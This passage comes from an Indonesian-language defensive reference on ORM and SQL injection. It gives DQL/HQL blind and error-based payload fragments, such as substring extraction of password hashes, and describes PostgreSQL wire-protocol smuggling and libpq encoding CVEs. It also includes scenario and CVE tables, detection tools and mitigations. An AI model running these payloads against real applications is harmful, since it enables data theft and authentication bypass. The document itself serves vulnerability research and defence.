| `LIMIT` | Tidak didukung — gunakan `setMaxResults()` |
| Akses tabel | Hanya melalui kelas entitas yang dipetakan |
| Boolean-based blind | `1 or 1=(select 1 from App\Entity\User a where a.id=1 and substring(a.password,1,1)='$')` |
| Error-based (SQLite) | Eksploitasi PHP UDF (`SQRT`, `MOD`, `LOCATE`) yang tidak diimplementasikan dalam SQLite → pengecualian membocorkan data dalam mode debug |
| UPDATE-based exfil | Subquery menulis rahasia ke field model yang dapat diakses publik |

**Insight Kunci:** Penyerang DQL tidak dapat mengakses tabel database yang tidak memiliki definisi model entitas yang sesuai dalam kode aplikasi, secara fundamental membatasi permukaan serangan dibandingkan dengan injeksi raw SQL.

### §7-3. Injeksi HQL dalam Konteks ORDER BY

Injeksi ORDER BY dalam HQL sangat menantang karena batasan parser. Namun, eksploitasi dimungkinkan via:

| Teknik | DBMS | Payload |
|---|---|---|
| **CASE-based blind** | Semua | `(CASE WHEN (subquery) THEN fieldA ELSE fieldB END)` |
| **Function-based** | PostgreSQL | Setara `dbms_pipe_receive_message()` via fungsi XML |
| **Error-based** | Oracle | `NVL(TO_CHAR(DBMS_XMLGEN.getxml('SQL')), col)` |

---

## §8. Query Smuggling Level Protokol Driver Database

Kelas serangan yang berbeda secara fundamental di mana injeksi tidak terjadi dalam konstruksi sintaks SQL tetapi di lapisan protokol biner antara driver database ORM dan server database.

### §8-1. Korupsi Batas Pesan Wire Protocol

| Target | CVE | Driver | Mekanisme |
|---|---|---|---|
| **PostgreSQL** | CVE-2024-27304 | pgx (Go), Npgsql (.NET), Diesel (Rust), SQLx (Rust) | Overflow panjang pesan 32-bit via parameter > 4GB |

**Mekanisme:** Wire protocol PostgreSQL menggunakan integer 32-bit untuk field panjang pesan. Ketika string parameter melebihi 2³² byte, field panjang mengalami overflow, menyebabkan database salah menginterpretasikan byte berikutnya sebagai pesan protokol baru. Penyerang menyematkan pernyataan SQL lengkap di wilayah overflow.

**Rantai Serangan:**
1. Aplikasi menggunakan parameterized query (tampaknya aman)
2. Penyerang menyediakan nilai parameter yang melebihi 4GB
3. Driver database membangun pesan protokol di mana field panjang memutar
4. PostgreSQL menginterpretasikan data overflow sebagai pesan query terpisah
5. Query yang disematkan dieksekusi dengan hak akses database penuh

**Dampak:** Bypass autentikasi, eksfiltrasi data, RCE — semua meskipun aplikasi menggunakan parameterized query yang benar.

**Mitigasi:** Terapkan batas ukuran input di lapisan aplikasi. Driver yang terpengaruh telah di-patch untuk memvalidasi panjang pesan sebelum transmisi.

### §8-2. Injeksi Encoding Mismatch

| Target | CVE | Mekanisme |
|---|---|---|
| **PostgreSQL** | CVE-2025-1094 | Cacat validasi UTF-8 dalam fungsi escape `libpq` (`PQescapeLiteral`, `PQescapeIdentifier`, `PQescapeStringConn`) memungkinkan SQL injection melalui urutan byte UTF-8 yang tidak valid |

**Mekanisme:** Fungsi escape library klien `libpq` PostgreSQL memproses secara tidak benar urutan byte UTF-8 yang tidak valid. Penyerang dapat membuat input yang mengandung UTF-8 tidak valid yang menyebabkan rutinitas escape gagal menetralisir tanda kutip tunggal yang signifikan secara sintaksis (`0x27`), meninggalkannya tanpa escape dalam string SQL yang dihasilkan. Ini berbeda dari teknik trailing-byte multibyte klasik BIG5/SJIS/GBK — CVE-2025-1094 secara khusus menargetkan logika validasi UTF-8.

---

## Pemetaan Skenario Serangan (Sumbu 3)

| Skenario | Arsitektur/Kondisi | Kategori Mutasi Utama | Oracle Tipikal |
|---|---|---|---|
| **Authentication Bypass** | Filter login menggunakan `filter(**user_input)` atau `findOne(user_input)` | §3, §4, §5 | Boolean (berhasil/gagal login) |
| **Eksfiltrasi Data Karakter-per-Karakter** | Endpoint filter mengekspos kontrol nama field + lookup operator | §3-1, §3-2, §3-3 | Boolean, Error, Time-based |
| **Eksfiltrasi Data Massal** | Raw query atau titik injeksi yang mampu UNION | §1, §7-1 (dengan magic function) | Langsung (hasil query dalam respons) |
| **Privilege Escalation** | Flag admin atau role yang dapat di-query via manipulasi filter | §3-1, §4-1 | Boolean |
| **Authorization Filter Circumvention** | Relasi M2M memungkinkan bypass kontrol akses berbasis join | §3-2 | Boolean |
| **Remote Code Execution** | DBMS mendukung eksekusi kode (PostgreSQL `COPY TO PROGRAM`, MySQL `INTO OUTFILE`, MSSQL `xp_cmdshell`) | §1-1, §7-1 (via magic function), §8-1 | Langsung |
| **Denial of Service** | Payload ReDoS, pola LIKE berat, atau cartesian join | §3-3 (regex), §3-4 (wildcard), §6 | Time-based / Error |

---

## Pemetaan CVE / Bounty (2019–2025)

| Kombinasi Mutasi | CVE / Kasus | Framework | Dampak / Catatan |
|---|---|---|---|
| §2-1 (injeksi alias) | CVE-2022-28346 | Django | `annotate()`, `aggregate()`, `extra()` — injeksi alias dictionary expansion |
| §2-2 (kunci JSONField) | CVE-2024-42005 | Django | `values()` / `values_list()` pada JSONField; CVSS 9.8 |
| §2-1 (injeksi alias) | CVE-2025-59681 | Django | `annotate()`, `alias()`, `aggregate()`, `extra()` — backend MySQL/MariaDB |
| §4-1 (injeksi connector) | CVE-2025-64459 | Django | Injeksi `_connector` / `_negated` dalam `filter()`, `exclude()`, `get()`, `Q()`; CVSS 9.1 |
| §4-2 (FilteredRelation) | CVE-2025-57833 | Django | Injeksi alias `FilteredRelation` via `annotate()`/`alias()` |
| §6-2 (injeksi komentar) | CVE-2023-22794 | ActiveRecord (Rails) | Injeksi komentar SQL dalam `annotate()` |
| §5-1 (operator string) | CVE-2019-10748 | Sequelize | Injeksi operator berbasis string (`$gt`, `$ne`, `$like`) |
| §5-2 (replacements) | CVE-2023-25813 | Sequelize | SQL injection via parameter `replacements` |
| §5-2 (nested object) | CVE-2022-33171 | TypeORM | Injeksi JSON yang di-parse `findOne()` |
| §5-2 (object driver) | CVE-2025-60542 | TypeORM | `repository.save()`/`update()` — default `stringifyObjects` driver mysql2 |
| §8-1 (protocol overflow) | CVE-2024-27304 | pgx, Npgsql, Diesel, SQLx | Overflow panjang 32-bit wire protocol PostgreSQL |
| §8-2 (encoding mismatch) | CVE-2025-1094 | PostgreSQL (libpq) | Bypass escape kutipan encoding mismatch multibyte |
| §7-1 (injeksi HQL) | CVE-2020-25638 | Hibernate | Injeksi komentar SQL dalam anotasi `@Where` |
| §3-1 (ORM Leak) | CVE-2023-47117 | Django (Label Studio) | Injeksi parameter filter mengeksfiltrasi data pengguna |
| §3-1 (ORM Leak) | CVE-2023-31133 | Prisma (Ghost CMS) | Injeksi operator membocorkan data anggota |
| §3-1 (ORM Leak) | CVE-2023-30843 | Prisma (Payload CMS) | Injeksi operator membocorkan kredensial |
| §3-1 (Ransack Leak) | — (beberapa aplikasi) | Ransack (Rails) | Eksfiltrasi token reset password (fablabs.io, CodeOcean, dll.) |

---

## Alat Deteksi

### Analisis Statis (Code Review)

| Alat | Target | Teknik Inti |
|---|---|---|
| **Semgrep** (SAST) | Python, JS, Java, Go, Ruby, PHP | Aturan taint tracking untuk fungsi sink ORM; ruleset `p/sql-injection` |
| **Brakeman** (SAST) | Ruby on Rails | Analisis statis spesifik untuk metode berbahaya ActiveRecord (`order`, `where`, `find_by_sql`) |
| **Bandit** (SAST) | Python | Mendeteksi `raw()`, `extra()`, SQL berformat string dalam Django/SQLAlchemy |
| **SonarQube** (SAST) | Multi-bahasa | Aturan deteksi injeksi ORM untuk Django, Hibernate, Entity Framework, Doctrine |
| **Laravel Enlightn** (SAST) | PHP/Laravel | Penganalisis injeksi raw SQL untuk `whereRaw()`, `orderByRaw()`, `DB::raw()` |
| **CodeQL** (SAST) | Multi-bahasa | Query kustom untuk pola injeksi ORM dengan taint tracking |

### Analisis Dinamis (Runtime Testing)

| Alat | Target | Teknik Inti |
|---|---|---|
| **sqlmap** (DAST) | Backend SQL apa pun | Deteksi injeksi otomatis: boolean-blind, time-blind, error-based, UNION, stacked query |
| **plormber** (ORM Leak) | Django, Prisma | Eksploitasi ORM Leak karakter-per-karakter otomatis via oracle time-based dan boolean |
| **Burp Suite** (DAST) | Aplikasi web | Pengujian manual/otomatis parameter filter, injeksi operator, dan endpoint raw SQL |
| **Nuclei** (DAST) | Aplikasi web | Pemindaian berbasis template untuk pola CVE injeksi ORM yang diketahui |

### Pertahanan Spesifik ORM

| Alat / Fitur | Framework | Mekanisme |
|---|---|---|
| **django-filter** | Django | Membatasi field yang dapat difilter via deklarasi `filterset_fields` eksplisit |
| **Ransack 4.0+** | Rails | Mengharuskan allowlist `ransackable_attributes` / `ransackable_associations` eksplisit |
| **Sequelize `operatorsAliases: false`** | Sequelize | Menonaktifkan operator berbasis string, mengharuskan `Op.*` berbasis Symbol |
| **Prisma Client Extensions** | Prisma | Middleware untuk validasi input sebelum eksekusi query |

---

## Ringkasan: Prinsip Inti

**Properti fundamental yang membuat injeksi ORM mungkin terjadi adalah ketidakcocokan impedansi antara dua model keamanan.** Model keamanan SQL didasarkan pada nilai yang diparameterisasi — struktur query ditetapkan pada waktu kompilasi, dan input pengguna hanya mengisi placeholder nilai. ORM, secara desain, membuat struktur query dinamis — nama field, operator, path join, kolom sort, dan logical connector semuanya dapat dikonfigurasi secara programatik. Ketika input pengguna mencapai parameter struktural mana pun dari API query ORM, aplikasi secara efektif telah memberikan kontrol atas struktur SQL kepada penyerang yang dirancang untuk diperbaiki oleh parameterisasi.

**Patch inkremental gagal karena permukaan serangan bersifat inheren pada abstraksi ORM.** Setiap CVE mengatasi sink injeksi tertentu — `extra()` di-deprecated, `_connector` divalidasi, operator string digantikan dengan Symbol — tetapi pola yang mendasarinya tetap ada: ORM harus mengekspos parameter query struktural agar berguna, dan developer akan meneruskan input pengguna ke parameter ini. Tren CVE 2024-2025 menunjukkan titik injeksi yang berpindah dari metode raw SQL yang jelas ke parameter struktural yang semakin halus (kunci field JSON, alias FilteredRelation, batas pesan level protokol), mendemonstrasikan bahwa permukaan serangan berkembang lebih cepat dari cakupan patch.

**Solusi struktural mengharuskan penegakan batas antara struktur query dan nilai query di level API.** Ini berarti: (1) **Validasi allowlist** untuk semua identifier (nama kolom, nama tabel, field sort, filter field) terhadap skema model — jangan pernah menerima string yang dikontrol pengguna sebagai identifier; (2) **Validasi skema** untuk semua parameter filter/query terhadap skema tipe yang ketat (Zod, Joi, Marshmallow, Strong Parameters) yang menolak struktur object yang tidak diharapkan; (3) **Opt-in eksplisit** untuk field yang dapat di-query, relasi, dan operator — framework seperti django-filter dan Ransack 4.0 yang mengharuskan deklarasi `filterset_fields` atau `ransackable_attributes` mewakili arah arsitektur yang benar; (4) **Batas ukuran input** untuk mempertahankan diri dari serangan level protokol. Tujuannya bukan membuat ORM "tahan-injeksi" tetapi mengurangi permukaan API yang menerima parameter struktural dari internet menjadi nol.

---

## Referensi

- PayloadsAllTheThings — ORM Leak (https://swisskyrepo.github.io/PayloadsAllTheThings/ORM%20Leak/)
- "plORMbing your Django ORM" — elttam (https://www.elttam.com/blog/plormbing-your-django-orm/)
- "ORM Leaking More Than You Joined For" — elttam (https://www.elttam.com/blog/leaking-more-than-you-joined-for/)
- "plORMbing your Prisma ORM with Time-based Attacks" — elttam (https://www.elttam.com/blog/plorming-your-primsa-orm/)
- "Exploiting a Ransack Query Injection" — Vaadata (https://www.vaadata.com/blog/ransack-query-injection-analysis-and-exploitation-of-an-orm-vulnerability/)
- "Ransacking your password reset tokens" — Positive Security (https://positive.security/blog/ransack-data-exfiltration)
- "New Methods for Exploiting ORM Injections in Java Applications" — Egorov & Soldatov, HITB 2016 (https://insinuator.net/2016/06/new-methods-for-exploiting-orm-injections-in-java-applications-hitb16/)
- "Exploiting Hibernate Injections" — SonarSource (https://www.sonarsource.com/blog/exploiting-hibernate-injections/)
- "SQL Injection Isn't Dead: Smuggling Queries at the Protocol Level" — Paul Gerste, DEF CON 32 (https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/)
- "DQL Injection" — Deteact (https://blog.deteact.com/dql-injection/)
- Rails SQL Injection Examples (https://rails-sqli.org/)
- Django Security Advisories (https://www.djangoproject.com/weblog/)
- Sequelize Security Advisories (https://github.com/sequelize/sequelize/security)
- TypeORM Security Advisories (https://github.com/typeorm/typeorm/security)
- "SQL Injection in ORMs 2025" — Propel (https://www.propelcode.ai/blog/sql-injection-orm-vulnerabilities-modern-frameworks-2025)
- "Preventing SQL Injection in Django" — Jacob Kaplan-Moss (https://jacobian.org/2020/may/15/preventing-sqli/)
- Doctrine ORM Security Documentation (https://www.doctrine-project.org/projects/doctrine-orm/en/3.2/reference/security.html)
- Entity Framework Core SQL Queries Security (https://learn.microsoft.com/en-us/ef/core/querying/sql-queries)
- GORM Security Documentation (https://gorm.io/docs/security.html)
- OWASP Laravel Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/Laravel_Cheat_Sheet.html)

---

*Dokumen ini dibuat untuk tujuan riset keamanan defensif dan pemahaman kerentanan.*